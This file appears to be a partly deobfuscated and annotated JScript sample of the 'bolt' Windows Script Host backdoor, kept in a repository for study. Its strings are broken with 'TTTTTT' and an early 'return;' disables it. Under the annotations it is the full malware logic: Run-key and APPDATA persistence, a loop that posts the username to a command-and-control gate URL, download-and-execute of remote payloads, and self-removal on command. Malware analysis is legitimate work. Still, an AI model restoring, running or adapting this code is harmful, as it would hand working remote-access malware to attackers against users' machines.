// ATTENTION: some strings were changes (TTTTTT added) to ensure the virus scanner does not interfere and I could check in this to my github repo 
return; // ensure script does nothing


function funcOne(arrayA, inputB) {
    // rearranges the array
    var locFunc = chooseStringFunc;
    while (true) {
        try {
            var localVariableB = parseInt(locFunc(481)) + -parseInt(locFunc(0x1da)) + parseInt(locFunc(0x1d2)) 
            + -parseInt(locFunc(0x1d3)) + -parseInt(locFunc(0x1f2)) 
            + parseInt(locFunc(0x1e6)) + parseInt(locFunc(0x1ea));
            if (localVariableB === inputB) {
                // only place get out of the 
                break;
            } else {
                arrayA.push(arrayA.shift());  // removes first element and add (push) it again. 
            }
        } catch (ex) {
            arrayA.push(arrayA.shift());
        }
    }
}


var stringArray = ['120430XXVIfh', '278099EkyzbF', 'Content-Type', 'length', 'charAt', 'quit', 'specialfolders', 'MSXML2.SerTTTTTTTTverXMLHTTP', '624145xRuAmy', 'savetofile', 'ExpandEnvironmentStrings', 'Microsoft.XMLTTTTTTHTTP', 'RegTTTTTTTTTDelete', 'fromCharCode', 'startup', '340843SSemfJ', 'scriptname', 'getTime', '|JS', 'deletefile', '224534NDdNec', '%USERNAME%', 'REG_SZ', 'wscriTTTTTTpt.shell', '997048hdfOCk', 'RegWrite', 'responseText', 'replace', 'split', 'random', 'expandenvironmentstrings', 'send', '427228dSLRBw', 'substr', 'HKCU\x5cSoftware\x5cbolt\x5cGUID', '://', 'indexOf', 'httpTTTTTTT://voubucleonteriTTTTTTTTTT.xyz/dimpan/gate.php', 'RegRead', 'copyfile', 'HKCU\x5csoftware\x5cmicrosoft\x5cwindows\x5ccurrentversion\x5crun\x5c', 'setRequestHeader', 'open', 'floor', 'regdelete', 'User-Agent', '%APPDATA%', 'application/x-www-form-urlencoded', 'wscriTTTTTTTpt.exe\x20//B\x20', 'scriptfullname', 'regwrite', 'type', 'files/'];
var chooseStringFunc = function (inputInt) {
    inputInt = inputInt - 448;
    var choosenString = stringArray[inputInt]; 
    return choosenString;
};

funcOne(stringArray, 353383);

var SaveSettings = 'HKTTTTTTTTTTCU\Software\bolt\GUID' //chooseStringFunc(500); 
 var shellobj = new ActiveXTTTTTTTtObject('wscriTTTTTTTTTTpt.shell'); // chooseStringFunc(489)
var filesystemobj = new ActiveXTTTTTTTTTObject('scriptTTTTTTTTing.filesystemobject');
var HKCU = 'HKCU\software\microsTTTTTTTTTTtoft\windows\currentversion\run\''; //chooseStringFunc(0x1c5);
var startup = shellobj['specialfolders']('startup') + '\x5c';
var installdir = shellobj['expandenvironmentstrings']('%APPDATA%') + '\x5c';
var temp = shellobj['ExpandEnvironmentStrings']('%TEMP%') + '\x5c';
var gate = 'httpTTTTTTTTTTTT://voubucleonteriTTTTTTTT.xyz/dimpan/gate.php'; //chooseStringFunc(0x1c2);
var user_agent = 'Mozilla/5.0\x20(X11;\x20Linux\x20x86_64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/87.0.4280.141\x20Safari/537.36\x20Vivaldi/3.5'; 
var time = 0xea60; 
do { install(), getCommand(), sleep(time); } while (true); 
function Download_exec(inputOne, inputTwo) { 
    if (inputOne[chooseStringFunc(0x1c1)](chooseStringFunc(0x1c0)) < 0x0) {
        var _0x51e5a6 = gate['split']('/');
    } 
    inputOne = gate[chooseStringFunc(0x1ed)](_0x51e5a6[_0x51e5a6['length'] - 0x1],
    chooseStringFunc(0x1d1) + inputOne); 
    var _0x36fc60 = new ActiveXTTTTTTTTObject(chooseStringFunc(0x1dd));
    var _0x29a907 = new ActiveXTTTTTTTTTObject('ADODTTTTTTTTTB.Stream'); 
    if (inputTwo == 0x1){
         var _0x556d8d = WSH['scriptTTTTTTTTTTfullname'];
    } else {
         var _0x33c997 = inputOne[chooseStringFunc(0x1f3)](inputOne[chooseStringFunc(0x1d5)] - 0x4, inputOne['length']), _0x464bae = '', _0x58c445 = 'abcdef0123456789', _0x2645d9 = _0x58c445[chooseStringFunc(0x1d5)];
        for (var _0x35372c = 0x0; _0x35372c < 0x8; _0x35372c++) { 
            _0x464bae += _0x58c445[chooseStringFunc(0x1d6)](Math[chooseStringFunc(0x1c8)](Math[chooseStringFunc(0x1ef)]() * _0x2645d9)); 
        } 
        var _0x556d8d = temp + _0x464bae + _0x33c997; 
    } 
        _0x36fc60[chooseStringFunc(0x1c7)]('GET', inputOne, ![]), _0x36fc60[chooseStringFunc(0x1f1)](), _0x29a907[chooseStringFunc(0x1d0)] = 0x1, _0x29a907[chooseStringFunc(0x1c7)], _0x29a907['write'](_0x36fc60['responseBody']), _0x29a907[chooseStringFunc(0x1db)](_0x556d8d, 0x2);
 try { 
    shellobj['run'](_0x556d8d); } 
    catch (ex) { } 
} 
 
 function install() {
    var wscriptExe = 'wscrTTTTTTTTTTTTtipt.exe //B' //chooseStringFunc(0x1cd); 
    try {
        shellobj[chooseStringFunc(0x1cf)](HKCU + WSH[chooseStringFunc(0x1e2)][chooseStringFunc(0x1ee)]('.')[0x0], wscriptExe + String['fromCharCode'](0x22) + installdir + WSH[chooseStringFunc(0x1e2)] + String[chooseStringFunc(0x1df)](0x22), chooseStringFunc(0x1e8)), filesystemobj[chooseStringFunc(0x1c4)](WSH[chooseStringFunc(0x1ce)], installdir + WSH[chooseStringFunc(0x1e2)], !![]);
    } catch (_0x34a799) { }
}
function getCommand() {
    try { 
        var _0x33b8fa = shellobj['RegRead'](SaveSettings); // 'HKCU\Software\bolt\GUID'
    } catch (ex) {
        var _0x33b8fa = '';
    } 
    var objXML = new ActiveXObject('MSXMLTTTTTTTT2.ServerXTTTTTTTTTTTTMLHTTP');  // chooseStringFunc(0x1d9) 
    objXML[chooseStringFunc('open')]('POST', gate, ![]), objXML[chooseStringFunc(0x1c6)](chooseStringFunc(0x1ca), user_agent), objXML[chooseStringFunc(0x1c6)](chooseStringFunc(0x1d4), chooseStringFunc(0x1cc)); 
    if (_0x33b8fa[chooseStringFunc(0x1d5)] < 0x8) {
        var _0xad0218 = '&id=1'; }
    else {var _0xad0218 = ''; }
    
    objXML[chooseStringFunc(0x1f1)]('bolt=' + shellobj[chooseStringFunc(0x1dc)](chooseStringFunc(0x1e7)) + '|' + _0x33b8fa + chooseStringFunc(0x1e4) + _0xad0218); 
    var response = objXML['responseText'];
    var  responseArray = response['split']('|'); 
    switch (responseArray[0x0]) { 
        case '00': shellobj['RegWrite'](SaveSettings, responseArray[0x1], 'REG_SZ');
            break; 
        case '01': Download_exec(responseArray[0x1], 0x0); break; 
        case '03': Download_exec(responseArray[0x1], 0x1); break; 
        case '19': shellobj[chooseStringFunc(0x1c9)](HKCU + WSH[chooseStringFunc(0x1e2)]['split']('.')[0x0]), filesystemobj[chooseStringFunc(0x1e5)](startup + WSH[chooseStringFunc(0x1e2)], !![]), filesystemobj[chooseStringFunc(0x1e5)](installdir + WSH['scriptname'], !![]), shellobj[chooseStringFunc(0x1de)](SaveSettings), WSH[chooseStringFunc(0x1d7)]();
            break;
     }
} 

function sleep(_0x4d228e) { 
    var _0xbd0447 = chooseStringFunc;
    var  _0x545a27 = new Date()[_0xbd0447(0x1e3)]();
     for (var _0x1dd736 = 0x0; _0x1dd736 < 0x989680; _0x1dd736++) {
         if (new Date()[_0xbd0447(0x1e3)]() - _0x545a27 > _0x4d228e) 
         break; 
    } 
}
